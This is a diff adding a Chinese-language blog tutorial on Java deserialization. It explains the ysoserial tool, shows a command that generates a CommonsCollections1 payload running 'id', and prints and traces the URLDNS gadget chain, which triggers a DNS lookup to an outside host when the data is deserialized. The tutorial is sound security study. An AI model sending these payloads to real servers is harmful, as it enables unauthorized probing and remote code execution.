@@ -632,6 +632,63 @@
       </tags>
   </entry>
   <entry>
+    <title>URLDNS</title>
+    <url>/2022/10/05/URLDNS/</url>
+    <content><![CDATA[<h2 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a><strong>ysoserial</strong></h2><p>在上手java反序列化的第一条链子之前，我们需要一个集成了java反序列化各种gadget chains（利用链）的工具，<a href="https://github.com/frohoff/ysoserial">ysoserial</a>。</p>
+<p>ysoserial下载好后还需要再安装一些其他的依赖，教程网上有很多，我就不细说了，我们先简单了解一下ysoserial中一些比较重要的东西。</p>
+<p>首先是序列化（Serialize）：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042134404.png" alt="image-20221004213407271"></p>
+<p>这个序列化操作和我之前提到的基本是一样的，将一个对象以字节流的形式输出并保存，并触发它的writeObject。</p>
+<p>反序列化（Unserialize 再ysoserial中叫Deserialize）：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042135076.png" alt="image-20221004213524007"></p>
+<p>将一个字节流读入还原为对象并触发它的readObject。</p>
+<p>Payloadrunner：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042136702.png" alt="image-20221004213650640"></p>
+<p>可以看到在Payloadrunner中，先将对象序列化再反序列化，其实就是用来运行我们的链，并生成相应的payload，具体执行命令（用cc链举例）：</p>
+<figure class="highlight shell"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 &quot;id&quot;</span><br></pre></td></tr></table></figure>
+
+<p>如果我们直接再intellij中运行这些链，不会出现payload，并且要注意一个问题，在java反序列化中几乎我们反序列化执行命令的结果是没有回显的，所以我们需要用一些比较明显的命令让我们知道这个链子被成功触发了，在ysoserial中我们一般用计算器<code>calc.exe</code>，一般来说ysoserial安装好后payload默认的参数是<code>calc.exe</code>，如果不是的话就要自己手动设置默认参数了，具体的我就不多说了。</p>
+<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a><strong>URLDNS</strong></h2><p>那么我们来上手java反序列化的第一条链子，<code>URLDNS</code>，这条链子的利用链很短，我们看一下ysoserial中的代码：</p>
+<figure class="highlight java"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一点点分析一下，首先从URL的创建开始：</p>
+<figure class="highlight java"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>先是用<code>URLStreamHandler</code>c创建了一个句柄，这个句柄可以打开一个指定的url。</li>
+<li>创建一个哈希表，并将url对象u作为key存入到了哈希表中。</li>
+</ul>
+<figure class="highlight java"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>这里将url对象u的hashCode设置成了-1，为什么要这么做我们一会在分析具体的触发过程时会提到。</li>
+<li>返回了哈希表对象ht，并用PayloadRunner运行该利用链。</li>
+</ul>
+<p>这段代码就干了这些事，那么是怎么触发反序列化的呢，我们之前提到过在反序列化时会触发readObject，那么我们直接去看Hashmap的readObject方法：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042158533.png" alt="image-20221004215848454"></p>
+<p>最重要的一行就是最后的<code>putValue</code>，里面计算了哈希表的键名。我们跟一下<code>putValue</code>方法，发现利用hash方法计算了哈希表的key。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042238521.png" alt="image-20221004223837455"></p>
+<p>我们再继续跟进hash方法，发现这里调用了哈希表key的hashcode方法，我们回到刚才创建哈希表时，是把url对象存入到了key中，所以我们直接去找<code>java.net.URL</code>的<code>hashCode</code>方法。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042239894.png" alt="image-20221004223927852"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042246526.png" alt="image-20221004224609475"></p>
+<p>如果hashCode值不为-1，那么就会return，这个就是我们前面提到要将hashCode的值设置为-1的原因。</p>
+<p>我们继续跟，handler此时是一个<code>URLStreamHandler</code>对象，继续跟进它的hashCode方法。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042248715.png" alt="image-20221004224824669"></p>
+<p>这里调用了getHostAddress方法，继续跟。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042248820.png" alt="image-20221004224850775"></p>
+<p>到这里可以看到<code>InetAddress.getByName(host)</code>的作用是根据主机名，获取其ip地址，在网络上就是一次DNS查询，我们可以通过burp的<code>Collaborator client</code>来看到这次url请求。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210051442767.png" alt="image-20221005144236700"></p>
+]]></content>
+      <categories>
+        <category>Java</category>
+        <category>web漏洞</category>
+      </categories>
+      <tags>
+        <tag>Java反序列化</tag>
+        <tag>URLDNS</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>XSS跨站脚本攻击</title>
     <url>/2022/07/20/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/</url>
     <content><![CDATA[<h1 id="XSS跨站脚本攻击"><a href="#XSS跨站脚本攻击" class="headerlink" title="XSS跨站脚本攻击"></a>XSS跨站脚本攻击</h1><h2 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h2><p>在前端开发三大件中 html组成了网页的框架 css组成 了网页的外貌 而JavaScript使整个网页动了起来 </p>
